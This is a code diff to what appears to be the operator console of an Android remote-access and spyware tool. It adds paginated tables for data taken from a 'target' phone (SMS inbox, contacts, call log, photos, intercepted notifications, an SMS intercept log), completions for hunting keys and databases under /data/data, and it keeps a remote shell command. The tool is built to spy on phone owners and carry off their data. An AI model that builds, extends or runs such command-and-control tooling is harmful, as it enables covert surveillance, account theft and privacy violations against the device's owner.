@@ -705,6 +705,425 @@ def download_b64(r, dest):
     return False
 
 
+# ─────────────────────────── data formatting & pagination ─────────────────
+
+def show_paginated_table(title, columns, rows, page_size=20, start_page=1):
+    """Render structured data in a Rich Table with interactive pagination."""
+    if not rows:
+        t = Table(title=f"[bold cyan]{title}[/bold cyan]", box=box.ROUNDED, border_style="cyan", header_style="bold magenta", expand=True)
+        for col in columns:
+            name = col[0] if isinstance(col, (tuple, list)) else col
+            t.add_column(name)
+        t.add_row(*["[dim]<none>[/dim]"] * len(columns))
+        console.print(t)
+        return
+
+    total = len(rows)
+    total_pages = max(1, (total + page_size - 1) // page_size)
+    cur_page = max(1, min(total_pages, start_page))
+    is_interactive = sys.stdin.isatty() and sys.stdout.isatty()
+
+    while True:
+        start_idx = (cur_page - 1) * page_size
+        end_idx = min(start_idx + page_size, total)
+        page_rows = rows[start_idx:end_idx]
+
+        page_str = f" [dim]· Page {cur_page}/{total_pages} ({total} total)[/dim]" if total_pages > 1 else f" [dim]· {total} items[/dim]"
+        t = Table(
+            title=f"[bold cyan]{title}[/bold cyan]{page_str}",
+            box=box.ROUNDED,
+            border_style="cyan",
+            header_style="bold magenta",
+            padding=(0, 1),
+            expand=True,
+        )
+        for col in columns:
+            if isinstance(col, (tuple, list)):
+                cname = col[0]
+                ckwargs = col[1] if len(col) > 1 and isinstance(col[1], dict) else {"style": col[1]} if len(col) > 1 else {}
+                t.add_column(cname, **ckwargs)
+            else:
+                t.add_column(str(col))
+
+        for r in page_rows:
+            t.add_row(*[str(cell) for cell in r])
+
+        console.print(t)
+
+        if total_pages <= 1 or not is_interactive:
+            break
+
+        if cur_page >= total_pages:
+            console.print(f"  [dim]── End of list ({total} items) ──[/dim]\n")
+            break
+
+        remaining = total - end_idx
+        prompt_str = f"  [cyan bold]Next page ({remaining} more)?[/cyan bold] [dim]Enter: next · a: all · q: quit · #jump: [/dim]"
+        try:
+            choice = input(prompt_str).strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            console.print()
+            break
+
+        if choice in ("q", "quit", "exit"):
+            break
+        elif choice in ("a", "all"):
+            cur_page += 1
+            is_interactive = False
+        elif choice.isdigit():
+            target_p = int(choice)
+            if 1 <= target_p <= total_pages:
+                cur_page = target_p
+            else:
+                cur_page += 1
+        else:
+            cur_page += 1
+
+
+def format_smsin(raw_text, page=1):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = [ln for ln in lines if ln]
+
+    rows = []
+    for idx, ln in enumerate(lines, 1):
+        parts = ln.split(" ")
+        if len(parts) >= 7:
+            addr = parts[0]
+            date_str = " ".join(parts[1:7])
+            body = " ".join(parts[7:])
+        elif len(parts) >= 2:
+            addr = parts[0]
+            date_str = parts[1]
+            body = " ".join(parts[2:])
+        else:
+            addr = "?"
+            date_str = "-"
+            body = ln
+        rows.append((str(idx), escape(addr), escape(date_str), escape(body)))
+
+    columns = [
+        ("#", {"style": "dim", "width": 4}),
+        ("From", {"style": "bold cyan", "width": 16}),
+        ("Date", {"style": "dim", "width": 26}),
+        ("Message", {"style": "white"}),
+    ]
+    show_paginated_table("INBOX SMS MESSAGES", columns, rows, page_size=15, start_page=page)
+
+
+def format_contacts(raw_text, page=1):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = [ln for ln in lines if ln]
+
+    rows = []
+    for idx, ln in enumerate(lines, 1):
+        if " | " in ln:
+            name, num = ln.split(" | ", 1)
+        else:
+            name, num = ln, ""
+        rows.append((str(idx), escape(name.strip()), escape(num.strip())))
+
+    columns = [
+        ("#", {"style": "dim", "width": 4}),
+        ("Contact Name", {"style": "bold white", "width": 28}),
+        ("Phone Number", {"style": "green"}),
+    ]
+    show_paginated_table("DEVICE CONTACTS", columns, rows, page_size=20, start_page=page)
+
+
+def format_calllog(raw_text, page=1):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = [ln for ln in lines if ln]
+
+    rows = []
+    for idx, ln in enumerate(lines, 1):
+        parts = ln.split(" ")
+        if len(parts) >= 8:
+            raw_type = parts[0]
+            number = parts[1]
+            date_str = " ".join(parts[2:8])
+            dur = parts[8] if len(parts) > 8 else "-"
+        elif len(parts) >= 3:
+            raw_type = parts[0]
+            number = parts[1]
+            date_str = parts[2]
+            dur = parts[3] if len(parts) > 3 else "-"
+        else:
+            raw_type = "-"
+            number = ln
+            date_str = "-"
+            dur = "-"
+
+        if raw_type == "in":
+            type_badge = "[bold green]INCOMING[/bold green]"
+        elif raw_type == "out":
+            type_badge = "[bold cyan]OUTGOING[/bold cyan]"
+        elif raw_type == "missed":
+            type_badge = "[bold red]MISSED[/bold red]"
+        else:
+            type_badge = f"[yellow]{escape(raw_type)}[/yellow]"
+
+        rows.append((str(idx), type_badge, escape(number), escape(date_str), escape(dur)))
+
+    columns = [
+        ("#", {"style": "dim", "width": 4}),
+        ("Type", {"width": 12, "justify": "center"}),
+        ("Number", {"style": "bold white", "width": 18}),
+        ("Date", {"style": "dim", "width": 26}),
+        ("Duration", {"style": "yellow", "justify": "right", "width": 10}),
+    ]
+    show_paginated_table("PHONE CALL LOG", columns, rows, page_size=20, start_page=page)
+
+
+def format_apps(raw_text, page=1):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = sorted(set(ln for ln in lines if ln))
+
+    rows = []
+    for idx, pkg in enumerate(lines, 1):
+        is_system = pkg.startswith(("com.android.", "android", "com.google.android.", "com.qualcomm.", "com.sec."))
+        type_badge = "[dim]system[/dim]" if is_system else "[bold green]user[/bold green]"
+        pkg_style = "[white]" if is_system else "[bold cyan]"
+        rows.append((str(idx), f"{pkg_style}{escape(pkg)}[/]", type_badge))
+
+    columns = [
+        ("#", {"style": "dim", "width": 5}),
+        ("Package Name", {"style": "white"}),
+        ("Type", {"width": 10, "justify": "center"}),
+    ]
+    show_paginated_table("INSTALLED PACKAGES", columns, rows, page_size=25, start_page=page)
+
+
+def format_photos(raw_text, page=1):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = [ln for ln in lines if ln]
+
+    rows = []
+    for idx, ln in enumerate(lines, 1):
+        parts = ln.rsplit(" ", 6)
+        if len(parts) == 2:
+            path = parts[0]
+            date_str = parts[1]
+        elif len(parts) > 1:
+            path = parts[0]
+            date_str = " ".join(parts[1:])
+        else:
+            path = ln
+            date_str = "-"
+        rows.append((str(idx), escape(path), escape(date_str)))
+
+    columns = [
+        ("#", {"style": "dim", "width": 4}),
+        ("Photo Path", {"style": "green"}),
+        ("Date Added", {"style": "dim", "width": 26}),
+    ]
+    show_paginated_table("MEDIA PHOTOS", columns, rows, page_size=20, start_page=page)
+
+
+def format_notifs(raw_text, page=1):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = [ln for ln in lines if ln]
+
+    rows = []
+    for ln in lines:
+        parts = ln.split(" ", 2)
+        if len(parts) >= 3 and ":" in parts[1]:
+            ts = f"{parts[0]} {parts[1]}"
+            rest = parts[2]
+            p_parts = rest.split(" ", 1)
+            pkg = p_parts[0]
+            content = p_parts[1] if len(p_parts) > 1 else ""
+        elif len(parts) >= 2:
+            ts = parts[0]
+            pkg = parts[1]
+            content = parts[2] if len(parts) > 2 else ""
+        else:
+            ts = "-"
+            pkg = "-"
+            content = ln
+        rows.append((escape(ts), escape(pkg), escape(content)))
+
+    columns = [
+        ("Time", {"style": "dim", "width": 14}),
+        ("Package", {"style": "cyan", "width": 22}),
+        ("Content", {"style": "white"}),
+    ]
+    show_paginated_table("INTERCEPTED NOTIFICATIONS", columns, rows, page_size=20, start_page=page)
+
+
+def format_ls(raw_text, path="/sdcard", page=1):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = sorted([ln for ln in lines if ln])
+
+    rows = []
+    for item in lines:
+        is_dir = item.endswith("/")
+        icon = "[bold cyan]DIR[/bold cyan]" if is_dir else "[dim]FILE[/dim]"
+        name_style = "[bold cyan]" if is_dir else "[white]"
+        rows.append((icon, f"{name_style}{escape(item)}[/]"))
+
+    columns = [
+        ("Type", {"width": 6, "justify": "center"}),
+        ("Name", {"style": "white"}),
+    ]
+    show_paginated_table(f"DIRECTORY · {escape(path or '/sdcard')}", columns, rows, page_size=25, start_page=page)
+
+
+def format_info(raw_text):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    text = raw_text
+    if text.startswith("OK"):
+        text = text[2:].strip()
+
+    fields = {}
+    for token in text.split():
+        if "=" in token:
+            k, v = token.split("=", 1)
+            fields[k.strip()] = v.strip()
+
+    t = Table(title="[bold cyan]DEVICE SYSTEM INFO[/bold cyan]", box=box.ROUNDED, border_style="cyan", header_style="bold magenta", expand=False)
+    t.add_column("Property", style="bold cyan", width=18)
+    t.add_column("Value", style="white")
+
+    t.add_row("Model / Brand", f"{fields.get('model', '?')} [dim](Android SDK {fields.get('sdk', '?')})[/dim]")
+    batt = fields.get("battery_pct", "?")
+    charging = fields.get("charging", "false")
+    batt_style = "green" if batt.isdigit() and int(batt) > 20 else "red"
+    charge_str = " [green](charging)[/green]" if charging == "true" else " [dim](discharging)[/dim]"
+    t.add_row("Battery", f"[{batt_style}]{batt}%[/]{charge_str}")
+
+    ram_tot = fields.get("ram_total_mb")
+    ram_avail = fields.get("ram_avail_mb")
+    if ram_tot and ram_avail:
+        t.add_row("Memory (RAM)", f"{int(ram_avail):,} MB free / {int(ram_tot):,} MB total")
+
+    stor_tot = fields.get("storage_total_gb")
+    stor_avail = fields.get("storage_avail_gb")
+    if stor_tot and stor_avail:
+        t.add_row("Storage", f"{stor_avail} GB free / {stor_tot} GB total")
+
+    uptime = fields.get("uptime_s")
+    if uptime and uptime.isdigit():
+        s = int(uptime)
+        t.add_row("Uptime", fmt_age(s))
+
+    ips = fields.get("ips")
+    if ips:
+        t.add_row("IP Addresses", escape(ips.replace(",", ", ")))
+
+    console.print(t)
+    console.print()
+
+
+def format_perms(raw_text):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = [ln for ln in lines if ln]
+
+    rows = []
+    for ln in lines:
+        if "=" in ln:
+            p, st = ln.split("=", 1)
+        elif ": " in ln:
+            p, st = ln.split(": ", 1)
+        else:
+            p, st = ln, "?"
+        p_clean = p.replace("android.permission.", "")
+        status_badge = "[bold green]GRANTED[/bold green]" if "grant" in st.lower() else "[bold red]DENIED[/bold red]"
+        rows.append((escape(p_clean), status_badge))
+
+    columns = [
+        ("Permission", {"style": "bold white"}),
+        ("Status", {"width": 12, "justify": "center"}),
+    ]
+    show_paginated_table("DEVICE PERMISSIONS", columns, rows, page_size=20)
+
+
+def format_log(raw_text):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
+    if lines and lines[0].startswith("OK"):
+        lines[0] = lines[0][3:].strip()
+    lines = [ln for ln in lines if ln]
+
+    rows = []
+    for idx, f in enumerate(lines, 1):
+        rows.append((str(idx), escape(f)))
+
+    columns = [
+        ("#", {"style": "dim", "width": 4}),
+        ("Log File", {"style": "cyan"}),
+    ]
+    show_paginated_table("CAPTURED LOG FILES", columns, rows, page_size=20)
+
+
+def format_smslog(raw_text):
+    if not raw_text or raw_text.startswith("ERR"):
+        show_result(raw_text)
+        return
+    lines = raw_text.splitlines()
+    if lines and lines[0].startswith("OK"):
+        lines = lines[1:]
+    body = "\n".join(lines).strip()
+    console.print(Panel(escape(body) if body else "[dim]<empty log>[/dim]", title="[bold cyan]SMS INTERCEPT LOG[/bold cyan]", border_style="cyan", box=box.ROUNDED, padding=(1, 2)))
+
+
+def format_history(start_page=1):
+    total = readline.get_current_history_length()
+    rows = []
+    for i in range(1, total + 1):
+        item = readline.get_history_item(i)
+        if item:
+            rows.append((str(i), escape(item)))
+    columns = [
+        ("#", {"style": "dim", "width": 5, "justify": "right"}),
+        ("Command", {"style": "white"}),
+    ]
+    show_paginated_table("COMMAND HISTORY", columns, rows, page_size=25, start_page=start_page)
+
+
 # ─────────────────────────── command dispatch ─────────────────────────
 
 COMMAND_INFO = {
@@ -726,8 +1145,8 @@ COMMAND_INFO = {
                "Renames a session ID or existing alias to a new label. Aliases persist in ~/.androremote/aliases.json.\nExample:\n  /rename c83f12ab target_phone"),
     "forget": ("manage", "/forget <id|tag>", "Remove session from tracking",
                "Removes session from memory and aliases. If the agent beacons again, it will be re-registered as new."),
-    "history": ("manage", "/history", "Display REPL command history",
-                "Shows numbered list of previously entered operator commands."),
+    "history": ("manage", "/history [page]", "Display REPL command history (paginated)",
+                "Shows numbered list of previously entered operator commands with pagination support."),
     "status": ("manage", "/status", "Display C2 server health & tunnel info",
                "Displays listener port, TLS state, crypto key fingerprint, tunnel URL and process status, uptime, and active session count."),
     "clear": ("manage", "/clear", "Clear console screen",
@@ -742,26 +1161,25 @@ COMMAND_INFO = {
     "info": ("recon", "/info", "Query device hardware, OS & battery info",
              "Gathers system properties, hardware board, OS release, and battery state."),
     "perms": ("recon", "/perms", "Check app permissions (SMS, camera, etc.)",
-              "Lists granted and denied runtime permissions on the device (SMS, contacts, location, camera, mic, storage)."),
-    "apps": ("recon", "/apps", "List user-installed app packages",
-             "Dumps package names of non-system applications installed on the device."),
-    "notifs": ("recon", "/notifs [n]", "Read intercepted notifications",
-              "Retrieves notifications captured by the notification listener service (default: all available, or last n)."),
+              "Displays granted and denied runtime permissions in a formatted table."),
+    "apps": ("recon", "/apps [page] [limit]", "List user-installed app packages (paginated)",
+             "Lists installed packages categorizing system vs user apps with pagination support."),
+    "notifs": ("recon", "/notifs [n] [page]", "Read intercepted notifications (paginated)",
+              "Retrieves captured notification history formatted with timestamps and package names."),
     "loc": ("recon", "/loc", "Get device GPS / network location fix",
             "Returns latitude, longitude, accuracy, provider, and timestamp of the last known location fix."),
-    "calllog": ("recon", "/calllog [n]", "Read call history (default 25)",
-                "Reads phone call history (number, name, call type, timestamp, duration)."),
-    "photos": ("recon", "/photos [n]", "List newest photos in MediaStore (default 30)",
-               "Queries device media index for recent photo paths, dimensions, and timestamps."),
-    "contacts": ("recon", "/contacts [n]", "Dump device contacts list (default 30)",
-                 "Retrieves phonebook contacts with display names and phone numbers."),
-    "smsin": ("recon", "/smsin [n]", "Read inbound SMS messages (default 20)",
-              "Reads inbox SMS messages from Telephony provider."),
-    # exec
+    "calllog": ("recon", "/calllog [n] [page]", "Read call history (paginated)",
+                "Displays incoming, outgoing, and missed call history in a formatted table."),
+    "photos": ("recon", "/photos [n] [page]", "List newest photos in MediaStore (paginated)",
+               "Queries device media store for recent photo paths and addition dates."),
+    "contacts": ("recon", "/contacts [n] [page]", "Dump device contacts list (paginated)",
+                 "Retrieves phonebook contacts with display names and phone numbers in a formatted table."),
+    "smsin": ("recon", "/smsin [n] [page]", "Read inbound SMS messages (paginated)",
+              "Reads inbox SMS messages with sender, timestamp, and message body in a formatted table."),
     "shell": ("exec", "/shell <cmd...>", "Execute shell command on target",
               "Executes command on device via Runtime.exec. Output is captured and returned.\nExample:\n  /shell id; getprop ro.product.model"),
-    "ls": ("exec", "/ls [path]", "List directory contents on device",
-           "Lists files and subdirectories. Defaults to /sdcard if path is omitted.\nExample:\n  /ls /sdcard/Download"),
+    "ls": ("exec", "/ls [path] [page]", "List directory contents on device (paginated)",
+           "Lists files and subdirectories in a formatted table with pagination. Defaults to /sdcard."),
     "startapp": ("exec", "/startapp <package>", "Launch application package",
                  "Launches the main launch intent for the specified package.\nExample:\n  /startapp com.android.chrome"),
     "get": ("exec", "/get <remote> <local>", "Download remote file (base64)",
@@ -1083,6 +1501,22 @@ def _compute_completions(text):
         return complete_filepath(text)
     if cmd == "rec" and arg_idx == 2:
         return complete_filepath(text)
+    if cmd == "build" and arg_idx == 1:
+        cands = []
+        if TUNNEL.get("url"):
+            cands.append(TUNNEL["url"])
+        cfg = tunnel_named_cfg()
+        if cfg and cfg.get("hostname"):
+            cands.append(f"https://{cfg['hostname']}")
+        return [u for u in cands if u.startswith(text)]
+    if cmd == "triage" and arg_idx == 1:
+        return [s for s in ("all", "info", "perms", "net", "notifs") if s.startswith(text)]
+    if cmd == "hunt" and arg_idx == 1:
+        return [s for s in ("docs", "keys", "db", "archives", "images") if s.startswith(text)]
+    if cmd == "hunt" and arg_idx == 2:
+        return [s for s in ("/sdcard", "/sdcard/Download", "/sdcard/DCIM", "/sdcard/Documents", "/data/data") if s.startswith(text)]
+    if cmd == "monitor" and arg_idx == 1:
+        return [s for s in ("status", "history", "clear") if s.startswith(text)]
 
     # Check plugin-specific completers
     if PLUGIN_MANAGER and PLUGIN_MANAGER.has_command(cmd):
@@ -1110,8 +1544,23 @@ def setup_autocomplete():
         readline.parse_and_bind("bind ^I rl_complete")
     else:
         readline.parse_and_bind("tab: complete")
+        readline.parse_and_bind("set show-all-if-ambiguous on")
+        readline.parse_and_bind("set completion-ignore-case on")
+        readline.parse_and_bind("set completion-query-items 200")
+        readline.parse_and_bind("set page-completions off")
     readline.set_completer_delims(" \t\n")
     readline.set_completer(c2_completer)
+
+
+def get_readline_prompt():
+    """Build ANSI prompt with \001...\002 markers so readline measures visible length accurately.
+    This prevents backspace from deleting the prompt."""
+    active = ACTIVE["id"]
+    if active:
+        tag = alias_tag(active)
+        return f"\001\033[1;35m\002c2\001\033[0m\002:\001\033[1;36m\002{tag}\001\033[0m\002 \001\033[1m\002❯\001\033[0m\002 "
+    else:
+        return "\001\033[1;35m\002c2\001\033[0m\002 \001\033[2m\002❯\001\033[0m\002 "
 
 
 def cmd_build(target_url=None):
@@ -1190,8 +1639,7 @@ def dispatch(argv):
     elif op in ("plugins", "plugin"):
         cmd_plugin(rest)
     elif op == "history":
-        for i in range(1, readline.get_current_history_length() + 1):
-            console.print(f"  [dim]{i:>3}[/dim]  {escape(readline.get_history_item(i))}")
+        format_history(start_page=int(rest[0]) if rest and rest[0].isdigit() else 1)
     elif op == "rename":
         if len(rest) < 2:
             usage("rename <id|current-tag> <new-tag>")
@@ -1225,23 +1673,32 @@ def dispatch(argv):
     elif op == "id":
         show_result(send_and_wait("ID") or "")
     elif op == "info":
-        show_result(send_and_wait("INFO") or "")
+        format_info(send_and_wait("INFO") or "")
     elif op == "contacts":
-        show_result(send_and_wait("CONTACTS " + (rest[0] if rest else "30")) or "")
+        n = rest[0] if rest and rest[0].isdigit() else "50"
+        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
+        format_contacts(send_and_wait(f"CONTACTS {n}") or "", page=page)
     elif op == "smsin":
-        show_result(send_and_wait("SMSIN " + (rest[0] if rest else "20")) or "")
+        n = rest[0] if rest and rest[0].isdigit() else "20"
+        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
+        format_smsin(send_and_wait(f"SMSIN {n}") or "", page=page)
     elif op == "perms":
-        show_result(send_and_wait("PERMS") or "")
+        format_perms(send_and_wait("PERMS") or "")
     elif op == "apps":
-        show_result(send_and_wait("APPS") or "")
+        page = int(rest[0]) if rest and rest[0].isdigit() else 1
+        format_apps(send_and_wait("APPS") or "", page=page)
     elif op == "notifs":
-        show_result(send_and_wait("NOTIFS " + (rest[0] if rest else "")) or "")
+        n = rest[0] if rest and rest[0].isdigit() else "25"
+        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
+        format_notifs(send_and_wait(f"NOTIFS {n}") or "", page=page)
     elif op == "log":
-        show_result(send_and_wait("LOG") or "")
+        format_log(send_and_wait("LOG") or "")
     elif op == "smslog":
-        show_result(send_and_wait("SMSLOG " + (rest[0] if rest else "")) or "")
+        format_smslog(send_and_wait("SMSLOG " + (rest[0] if rest else "")) or "")
     elif op == "ls":
-        show_result(send_and_wait("LS " + (rest[0] if rest else "")) or "")
+        path = rest[0] if rest and not rest[0].isdigit() else "/sdcard"
+        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else (int(rest[0]) if rest and rest[0].isdigit() else 1)
+        format_ls(send_and_wait(f"LS {path}") or "", path=path, page=page)
     elif op == "shell":
         if not rest:
             usage("shell <cmd...>")
@@ -1258,7 +1715,9 @@ def dispatch(argv):
         else:
             show_result(send_and_wait("SMS " + rest[0] + " " + " ".join(rest[1:])) or "")
     elif op == "calllog":
-        show_result(send_and_wait("CALLLOG " + (rest[0] if rest else "25")) or "")
+        n = rest[0] if rest and rest[0].isdigit() else "25"
+        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
+        format_calllog(send_and_wait(f"CALLLOG {n}") or "", page=page)
     elif op == "call":
         if not rest:
             usage("call <number>")
@@ -1267,7 +1726,9 @@ def dispatch(argv):
     elif op == "loc":
         show_result(send_and_wait("LOC") or "")
     elif op == "photos":
-        show_result(send_and_wait("PHOTOS " + (rest[0] if rest else "30")) or "")
+        n = rest[0] if rest and rest[0].isdigit() else "30"
+        page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
+        format_photos(send_and_wait(f"PHOTOS {n}") or "", page=page)
     elif op == "get":
         if len(rest) < 2:
             usage("get <remote> <local>")
@@ -1403,13 +1864,8 @@ def repl():
     except Exception:
         pass
     while True:
-        active = ACTIVE["id"]
-        if active:
-            prompt = "[magenta bold]c2[/][dim]:[/][cyan bold]" + escape(alias_tag(active)) + "[/] [bold]❯[/] "
-        else:
-            prompt = "[magenta bold]c2[/] [dim]❯[/] "
         try:
-            line = console.input(prompt).strip()
+            line = input(get_readline_prompt()).strip()
         except (EOFError, KeyboardInterrupt):
             console.print()
             break
